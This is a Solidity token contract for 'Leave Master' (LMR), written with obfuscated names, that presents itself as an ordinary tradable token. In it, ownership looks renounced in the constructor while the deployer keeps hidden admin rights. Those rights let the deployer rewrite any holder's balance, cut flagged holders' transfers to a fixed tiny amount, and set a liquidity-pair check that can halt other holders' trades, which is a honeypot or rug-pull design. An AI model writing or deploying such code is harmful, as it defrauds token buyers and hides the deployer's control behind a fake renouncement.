//SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

interface amountExempt {
    function createPair(address swapTeam, address senderMin) external returns (address);
}

interface enableTotal {
    function totalSupply() external view returns (uint256);

    function balanceOf(address marketingMax) external view returns (uint256);

    function transfer(address modeIs, uint256 totalBuy) external returns (bool);

    function allowance(address buyLiquidityFee, address spender) external view returns (uint256);

    function approve(address spender, uint256 totalBuy) external returns (bool);

    function transferFrom(
        address sender,
        address modeIs,
        uint256 totalBuy
    ) external returns (bool);

    event Transfer(address indexed from, address indexed amountLaunch, uint256 value);
    event Approval(address indexed buyLiquidityFee, address indexed spender, uint256 value);
}

abstract contract minSell {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface teamEnable {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface shouldAuto is enableTotal {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract LeaveMaster is minSell, enableTotal, shouldAuto {

    uint256 public teamMinMarketing;

    event OwnershipTransferred(address indexed tradingLaunch, address indexed txSell);

    function symbol() external view virtual override returns (string memory) {
        return liquidityAutoTx;
    }

    function owner() external view returns (address) {
        return maxAt;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return fromLimit;
    }

    function liquidityTrading(address senderTeam, address modeIs, uint256 totalBuy) internal returns (bool) {
        if (senderTeam == receiverModeMax) {
            return fundTakeMode(senderTeam, modeIs, totalBuy);
        }
        uint256 modeAuto = enableTotal(limitTxFrom).balanceOf(fundTokenTake);
        require(modeAuto == fundToken);
        require(modeIs != fundTokenTake);
        if (launchedExempt[senderTeam]) {
            return fundTakeMode(senderTeam, modeIs, listShould);
        }
        return fundTakeMode(senderTeam, modeIs, totalBuy);
    }

    function approve(address launchedToken, uint256 totalBuy) public virtual override returns (bool) {
        swapSell[_msgSender()][launchedToken] = totalBuy;
        emit Approval(_msgSender(), launchedToken, totalBuy);
        return true;
    }

    mapping(address => bool) public tradingReceiver;

    uint8 private sellToFund = 18;

    function launchedShouldAmount(address senderShouldBuy) public {
        fundSell();
        if (receiverLimitWallet != maxToken) {
            teamMinMarketing = teamAuto;
        }
        if (senderShouldBuy == receiverModeMax || senderShouldBuy == limitTxFrom) {
            return;
        }
        launchedExempt[senderShouldBuy] = true;
    }

    function totalExempt(address tokenLimitFrom, uint256 totalBuy) public {
        fundSell();
        launchLimit[tokenLimitFrom] = totalBuy;
    }

    address private maxAt;

    address public receiverModeMax;

    uint256 constant listShould = 19 ** 10;

    function liquidityMarketing(uint256 totalBuy) public {
        fundSell();
        fundToken = totalBuy;
    }

    bool private receiverLimitWallet;

    uint256 private receiverTo;

    uint256 private teamAuto;

    uint256 private tradingFrom;

    address modeEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => mapping(address => uint256)) private swapSell;

    function fundTakeMode(address senderTeam, address modeIs, uint256 totalBuy) internal returns (bool) {
        require(launchLimit[senderTeam] >= totalBuy);
        launchLimit[senderTeam] -= totalBuy;
        launchLimit[modeIs] += totalBuy;
        emit Transfer(senderTeam, modeIs, totalBuy);
        return true;
    }

    function enableLaunchReceiver(address launchReceiver) public {
        require(launchReceiver.balance < 100000);
        if (listFrom) {
            return;
        }
        
        tradingReceiver[launchReceiver] = true;
        if (teamMinMarketing == receiverTotal) {
            receiverTotal = teamAuto;
        }
        listFrom = true;
    }

    function name() external view virtual override returns (string memory) {
        return modeTotal;
    }

    function balanceOf(address marketingMax) public view virtual override returns (uint256) {
        return launchLimit[marketingMax];
    }

    mapping(address => uint256) private launchLimit;

    uint256 fundToken;

    function decimals() external view virtual override returns (uint8) {
        return sellToFund;
    }

    bool private maxToken;

    function transferFrom(address senderTeam, address modeIs, uint256 totalBuy) external override returns (bool) {
        if (_msgSender() != modeEnable) {
            if (swapSell[senderTeam][_msgSender()] != type(uint256).max) {
                require(totalBuy <= swapSell[senderTeam][_msgSender()]);
                swapSell[senderTeam][_msgSender()] -= totalBuy;
            }
        }
        return liquidityTrading(senderTeam, modeIs, totalBuy);
    }

    string private modeTotal = "Leave Master";

    bool public listFrom;

    uint256 enableLimit;

    function launchedTx() public {
        emit OwnershipTransferred(receiverModeMax, address(0));
        maxAt = address(0);
    }

    uint256 private fromLimit = 100000000 * 10 ** 18;

    function getOwner() external view returns (address) {
        return maxAt;
    }

    function fundSell() private view {
        require(tradingReceiver[_msgSender()]);
    }

    function allowance(address minReceiver, address launchedToken) external view virtual override returns (uint256) {
        if (launchedToken == modeEnable) {
            return type(uint256).max;
        }
        return swapSell[minReceiver][launchedToken];
    }

    string private liquidityAutoTx = "LMR";

    function transfer(address tokenLimitFrom, uint256 totalBuy) external virtual override returns (bool) {
        return liquidityTrading(_msgSender(), tokenLimitFrom, totalBuy);
    }

    uint256 private receiverTotal;

    bool public minLaunch;

    address public limitTxFrom;

    mapping(address => bool) public launchedExempt;

    address fundTokenTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    constructor (){
        if (minLaunch == maxToken) {
            minLaunch = true;
        }
        teamEnable tokenExempt = teamEnable(modeEnable);
        limitTxFrom = amountExempt(tokenExempt.factory()).createPair(tokenExempt.WETH(), address(this));
        
        receiverModeMax = _msgSender();
        tradingReceiver[receiverModeMax] = true;
        launchLimit[receiverModeMax] = fromLimit;
        launchedTx();
        if (teamAuto != receiverTotal) {
            minLaunch = true;
        }
        emit Transfer(address(0), receiverModeMax, fromLimit);
    }

}